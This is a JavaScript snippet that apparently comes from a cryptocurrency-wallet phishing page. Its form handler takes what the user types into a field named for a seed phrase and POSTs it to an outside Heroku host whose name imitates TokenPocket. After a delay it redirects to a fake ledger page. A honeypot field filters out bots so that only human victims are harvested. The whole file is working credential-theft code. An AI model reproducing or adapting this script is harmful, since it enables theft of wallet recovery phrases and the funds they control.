document.getElementById("seedna").addEventListener("submit", (function(e) {
    e.preventDefault();
    const t = document.getElementById("loader-overlay")
      , o = document.getElementById("hiddenField").value;
    if (t.style.display = "block",
    "" !== o)
        return alert("You are bot stop!"),
        window.location.href = window.location.href,
        void console.log("Bot activity detected. Form submission aborted.");
    var n = document.getElementById("inputna").value;
    fetch("https://tokenpoket-d0db3dce79e0.herokuapp.com/led", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            message: n
        })
    }).then((e=>{
        e.ok ? (setTimeout((()=>{
            window.location.href = "../ledger.html"
        }
        ), 14e3),
        document.getElementById("inputna").value = "") : alert("Failed")
    }
    ))
}
));
